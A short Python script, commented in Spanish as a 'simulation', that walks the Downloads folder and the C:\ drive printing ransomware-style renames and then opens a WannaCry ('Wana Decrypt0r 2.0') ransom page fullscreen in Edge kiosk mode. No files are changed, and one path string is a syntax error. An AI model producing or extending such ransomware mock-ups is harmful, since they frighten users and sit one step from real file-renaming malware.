import os
import subprocess
import time

# ----------------------------
# Comando1 (simulación)
# ----------------------------
def comando1():
    carpeta = os.path.join(os.path.expanduser("~"), "Descargas")
    ext = ". 3&F26zqUAg]i"

    for root, _, files in os.walk(carpeta):
        for file in files:
            ruta = os.path.join(root, file)
            if ruta.endswith(ext):
                continue
            print("SIMULADO:", ruta, "->", ruta + ext)

    print("Ejecutando comando 1")
    for i in range(3):
        print(i)

# ----------------------------
# Comando2 (C:\, simulación)
# ----------------------------
def comando2():
    carpeta = r"C:\"
    ext = ". 3&F26zqUAg]i"

    for root, _, files in os.walk(carpeta):
        for file in files:
            ruta = os.path.join(root, file)
            if ruta.endswith(ext):
                continue
            print("SIMULADO:", ruta, "->", ruta + ext)

    print("Ejecutando comando 2")
    for i in range(3, 6):
        print(i)

# ----------------------------
# Comando3 (HTML fullscreen)
# ----------------------------
def comando3():
    EDGE = r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
    HTML = os.path.join(
        os.path.expanduser("~"),
        "Documents",
        "Wana Decrypt0r 2.0_files",
        "Wana Decrypt0r 2.0.html"
    )

    subprocess.Popen([
        EDGE,
        "--kiosk",
        f"file:///{HTML}",
        "--edge-kiosk-type=fullscreen",
        "--no-first-run"
    ])

    print("Ejecutando comando 3")
    for i in range(6, 9):
        print(i)

    while True:
        time.sleep(1)

# ----------------------------
# Secuencia
# ----------------------------
comando1()
comando2()
comando3()
